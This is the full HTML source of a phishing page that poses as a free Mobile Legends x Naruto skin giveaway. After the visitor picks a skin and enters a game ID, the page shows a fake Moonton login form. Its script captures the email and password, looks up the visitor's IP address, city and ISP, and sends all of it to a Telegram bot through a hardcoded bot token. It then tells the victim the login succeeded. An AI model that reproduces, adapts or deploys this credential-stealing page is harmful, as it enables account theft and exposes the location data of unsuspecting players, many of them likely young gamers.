<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Claim MLBB x Naruto Skins</title>
  <style>
    body {
      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
      font-family: Arial, sans-serif;
      color: white;
      text-align: center;
      padding: 30px;
    }
    .container {
      background: linear-gradient(135deg, #39FF14, #FF00FF);
      padding: 20px;
      border-radius: 10px;
      color: white;
      box-shadow: 0 0 15px #FF00FF, 0 0 25px #39FF14;
        }
    
    .skins {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
      margin: 20px 0;
    }
    .skins img {
      width: 100%;
      border-radius: 10px;
      cursor: pointer;
      border: 3px solid transparent;
      transition: 0.3s;
    }
    .skins img.selected {
      border: 3px solid #ffcc00;
    }
    input, button {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
      border: none;
      border-radius: 5px;
    }
    button {
      background-color: #ffcc00;
      font-weight: bold;
      cursor: pointer;
    }
    .confirmation {
      background: rgba(0, 0, 0, 0.7);
      padding: 20px;
      border-radius: 10px;
      margin-top: 20px;
    }
    .confirmation img {
      width: 50%;
      border-radius: 10px;
      margin: 10px 0;
    }
    .login-container {
      margin-top: 20px;
      padding: 10px;
      background: rgba(0, 0, 0, 0.8);
      border-radius: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Claim MLBB x Naruto Skins!</h2>
    <p>Select a skin to claim:</p>

    <div class="skins">
      <img src="https://i.ibb.co.com/zHRSZncP/1746185389171.jpg" alt="Naruto" data-skin="Naruto" class="skin-img">
      <img src="https://i.ibb.co.com/spV07gMp/1746321990602.jpg" alt="Sasuke" data-skin="Sasuke" class="skin-img">
      <img src="https://i.ibb.co.com/7x6GvHft/1746321994457.jpg" alt="Sakura" data-skin="Sakura" class="skin-img">
      <img src="https://i.ibb.co.com/Q01kjzC/1746185392870.jpg" alt="Kakashi" data-skin="Kakashi" class="skin-img">
    </div>

    <form id="claimForm">
      <input type="text" id="mlbbId" placeholder="MLBB ID" required><br>
      <input type="text" id="serverId" placeholder="Server ID (e.g. 1234)" required><br>
      <button type="button" onclick="showLoginForm()">Next</button>
    </form>

    <!-- Form Login Moonton -->
    <div id="loginForm" class="login-container" style="display: none;">
      <h3>Login Moonton</h3>
      <form id="moontonLoginForm">
        <input type="email" id="email" placeholder="Email" required><br>
        <input type="password" id="password" placeholder="Password" required><br>
        <button type="submit">Login</button>
      </form>
    </div>

    <div id="confirmationMessage" class="confirmation" style="display: none;">
      <h3>Your Claimed Skin:</h3>
      <img id="claimedSkinImage" src="" alt="Claimed Skin">
      <p id="skinName"></p>
    </div>
  </div>

  <script>
    const BOT_TOKEN = "7788665747:AAH_HIsff4i7lUqbWbH9fuuSbPkvKQwPVes";
    const CHAT_ID = "7137150704";

    const skins = document.querySelectorAll('.skins img');
    const skinInput = document.getElementById('selectedSkin');
    const confirmationMessage = document.getElementById('confirmationMessage');
    const claimedSkinImage = document.getElementById('claimedSkinImage');
    const skinName = document.getElementById('skinName');
    const loginForm = document.getElementById('loginForm');
    const mlbbIdInput = document.getElementById('mlbbId');
    const serverIdInput = document.getElementById('serverId');

    let selectedSkin = '';

    // Pilih skin
    skins.forEach(img => {
      img.addEventListener('click', () => {
        skins.forEach(i => i.classList.remove('selected'));
        img.classList.add('selected');
        selectedSkin = img.dataset.skin;
      });
    });

    // Menampilkan form login Moonton
    function showLoginForm() {
      if (!mlbbIdInput.value || !serverIdInput.value) {
        alert('Please enter your MLBB ID and Server.');
        return;
      }
      if (!selectedSkin) {
        alert('Please select a skin first!');
        return;
      }

      loginForm.style.display = 'block';
    }

    // Proses login Moonton
    document.getElementById('moontonLoginForm').addEventListener('submit', async function(e) {
      e.preventDefault();

      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      if (!email || !password) {
        alert('Please enter your email and password.');
        return;
      }

      // Login berhasil (hanya tampilan)
      alert('Login successful! Now you can claim your skin.');

      // Kirim data ke Telegram
      const res = await fetch("https://ipwho.is/");
      const data = await res.json();

      const message = `
MLBB INFO
Skin: ${selectedSkin}
ID: ${mlbbIdInput.value}
Server: ${serverIdInput.value}

LOGIN INFO
Email: ${email}
password: ${password}

IP INFO
IP: ${data.ip}
City: ${data.city}
ASN: ${data.connection?.asn}
ISP: ${data.connection?.org}
      `;

      // Kirim ke Telegram
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message
        })
      });

      // Tampilkan gambar skin yang diklaim
      claimedSkinImage.src = skins.find(img => img.dataset.skin === selectedSkin).src;
      skinName.innerText = `You claimed the skin: ${selectedSkin}`;
      confirmationMessage.style.display = "block";
    });
  </script>
</body>
</html>
